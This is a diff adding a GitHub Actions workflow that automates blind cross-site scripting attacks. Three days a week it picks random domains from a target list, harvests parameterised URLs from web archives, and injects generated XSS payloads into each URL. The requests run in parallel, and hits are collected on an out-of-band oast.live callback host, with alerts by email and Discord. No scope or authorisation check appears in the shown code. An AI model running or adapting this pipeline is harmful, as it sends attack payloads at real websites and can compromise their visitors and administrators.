@@ -1,0 +1,140 @@
+name: "Blind XSS Hunter with AI Triage"
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_count:
+        description: 'Number of targets to scan'
+        required: false
+        default: '3'
+      use_ai_triage:
+        description: 'Use AI to prioritize URLs'
+        required: false
+        default: true
+        type: boolean
+      payload_mode:
+        description: 'Payload mode (smart/full)'
+        required: false
+        default: 'smart'
+        type: choice
+        options:
+          - smart
+          - full
+  schedule:
+    - cron: '0 6 * * 2,4,6'
+
+jobs:
+  bxss-scan:
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+        
+      - name: Setup Environment
+        uses: actions/setup-go@v5
+        with:
+          go-version: '1.21'
+          cache: true
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+          
+      - name: Install Tools
+        run: |
+          go install github.com/tomnomnom/waybackurls@latest
+          go install github.com/tomnomnom/qsreplace@latest
+          go install github.com/lc/gau/v2/cmd/gau@latest
+          pip install uro google-generativeai
+          echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
+        
+      - name: Prepare Workspace
+        run: mkdir -p tmp results reports
+
+      - name: Collect URLs
+        shell: bash
+        env:
+          TARGET_COUNT: ${{ github.event.inputs.target_count || '3' }}
+        run: |
+          if [[ ! -f targets.txt ]]; then echo "❌ targets.txt missing"; exit 1; fi
+          shuf -n "$TARGET_COUNT" targets.txt > tmp/active_targets.txt
+          
+          while read -r domain; do
+            [[ -z "$domain" || "$domain" =~ ^# ]] && continue
+            (waybackurls "$domain" 2>/dev/null; gau "$domain" --threads 5 2>/dev/null) >> tmp/raw_urls.txt
+          done < tmp/active_targets.txt
+          
+          cat tmp/raw_urls.txt | grep "=" | uro --filters hasparams > tmp/filtered.txt || touch tmp/filtered.txt
+
+      - name: AI Triage
+        if: github.event.inputs.use_ai_triage == true
+        shell: bash
+        env:
+          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
+        run: |
+          if [[ -s tmp/filtered.txt && -n "$GEMINI_API_KEY" ]]; then
+            python3 ai_triage.py tmp/filtered.txt tmp/
+            cat tmp/high_priority.txt tmp/medium_priority.txt > tmp/final_targets.txt || cp tmp/filtered.txt tmp/final_targets.txt
+          else
+            cp tmp/filtered.txt tmp/final_targets.txt
+          fi
+
+      - name: Generate Payloads
+        shell: bash
+        env:
+          OAST_URL: "d51hku5a9dbj8v34kungg3phr1jdxfm8w.oast.live"
+          MODE: ${{ github.event.inputs.payload_mode || 'smart' }}
+        run: |
+          if [[ "$MODE" == "full" ]]; then
+            python3 generate_payloads.py "$OAST_URL" tmp/payloads.txt --all
+          else
+            python3 generate_payloads.py "$OAST_URL" tmp/payloads.txt
+          fi
+
+      - name: Inject Payloads
+        shell: bash
+        run: |
+          if [[ ! -s tmp/final_targets.txt || ! -s tmp/payloads.txt ]]; then exit 0; fi
+          
+          mapfile -t PAYLOADS < tmp/payloads.txt
+          for i in "${!PAYLOADS[@]}"; do
+            payload="${PAYLOADS[$i]}"
+            echo "💉 Injecting variant $((i+1))"
+            cat tmp/final_targets.txt | qsreplace "$payload" | xargs -I {} -P 15 curl -sk -L -m 8 -A "Mozilla/5.0" "{}" -o /dev/null 2>/dev/null
+            [[ $((i % 3)) -eq 2 ]] && sleep 2
+          done
+
+      - name: Generate Summary Report
+        if: always()
+        run: |
+          echo "# Scan Summary" > reports/scan_summary.md
+          echo "- **Targets:** $(wc -l < tmp/active_targets.txt)" >> reports/scan_summary.md
+          echo "- **OAST:** d51hku5a9dbj8v34kungg3phr1jdxfm8w.oast.live" >> reports/scan_summary.md
+
+      - name: Send Summary Email
+        # FIXED: Using env variable to check for secret existence
+        if: always() && env.MAIL_CHECK != ''
+        uses: dawidd6/action-send-mail@v3
+        env:
+          MAIL_CHECK: ${{ secrets.EMAIL_USERNAME }}
+        with:
+          server_address: smtp.gmail.com
+          server_port: 465
+          secure: true
+          username: ${{ secrets.EMAIL_USERNAME }}
+          password: ${{ secrets.EMAIL_PASSWORD }}
+          subject: "✅ BXSS Scan Run #${{ github.run_number }} Complete"
+          to: ${{ secrets.EMAIL_USERNAME }}
+          from: "BXSS Hunter"
+          body: file://reports/scan_summary.md
+
+      - name: Notify Discord
+        # FIXED: Using env variable to check for secret existence
+        if: always() && env.DISCORD_CHECK != ''
+        shell: bash
+        env:
+          DISCORD_CHECK: ${{ secrets.DISCORD_WEBHOOK }}
+        run: |
+          curl -X POST "$DISCORD_CHECK" -H "Content-Type: application/json" \
+            -d '{"content": "🚀 **BXSS Scan Complete!** Check your OAST dashboard for hits from `d51hku...oast.live`"}'
